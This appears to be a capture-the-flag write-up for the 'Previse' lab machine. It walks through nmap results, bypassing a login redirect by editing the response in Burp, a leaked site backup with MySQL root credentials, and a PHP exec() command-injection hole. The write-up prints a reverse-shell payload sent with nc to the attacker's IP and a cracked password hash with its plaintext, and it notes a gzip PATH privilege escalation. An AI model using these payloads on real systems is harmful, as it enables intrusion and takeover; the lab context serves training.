# Previse # 

## 1. Nmap 

~~~sql
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

~ We see that httponly is not set, so we could steal the admin pass with some simple XSS. We keep this in mind. Let's continue to Burp.. Burp doesn't seem to show anything special, besides the session cookie in the request which seems to always be the same : ==5jv8fbo6lush7c9d7kthnjc8bs== (Maybe because cache??)
~ We try to find more about this httponly flag, while running dirbuster in the background..

## 2. Dirbuster
~ We found a "nav.php" page which seems to belong to the admin, because it has the "create account" href.. We try and use that but we get redirected. We can just intercept the response in BURP and set the code of the page 200 instead of the 302 redirect.. BOOM we are logged in!!

## Web exploitation
~ Found a backup_site.zip. It contains all the code from the page.. We should be able to solve this without any help now. Following the log files, we know that the username of admin is "m4lwhere"

* From the zip file : *

		Sql Creds : 
			Name : root
			Password : mySQL_p@ssw0rd!:)
			Db : previse
	
	Intresting log file : 
	
~~~php
	<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");                                  
echo $output;                                                                                                     
                                                                                 
$filepath = "/var/www/out.log";                                                                                   
$filename = "out.log";                                                                                            
                                                                         
if(file_exists($filepath)) {                                                                                      
    header('Content-Description: File Transfer');                                                                 
    header('Content-Type: application/octet-stream');                                                             
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');                                
    header('Expires: 0');                                                                                         
    header('Cache-Control: must-revalidate');                                                                     
    header('Pragma: public');                                                                                     
    header('Content-Length: ' . filesize($filepath));                                                             
    ob_clean(); // Discard data in the output buffer                                                              
    flush(); // Flush system headers                                                                              
    readfile($filepath);                                                                                          
    die();                                                                                                        
} else {                                                                                                          
    http_response_code(404);                                                                                      
    die();
} 
?>
~~~

This dev used an "exec" php function to actually delim the log items so we can easily exploit that and get a reverse shell..let's try..
~~~sql
delim=comma%3b+nc+10.10.14.209+1234+-e+/bin/bash --- inside burp request
~~~ 

Played around the server and with the help of SQL creds we got the user hash... Unfortunately, I feel it will pe kinda hard for us to crack it.. : 
*  \$1\$🧂llol$DQpmdvnb7EeuO6UaqRItf. 

One thing which induced me in error was the salt emoji... I thought it was some kind of indication that the "llol$" part is actually just salt and I wasted some time with hashcat on this.. I'm not good enough yet it seems... FUCK!!!! Anyhow, we cracked the password : ilovecody112235! (after 10 mins)


## 3. Privesc
Simple privesc in the end, exploiting the gzip binary along with adding a new PATH variable.
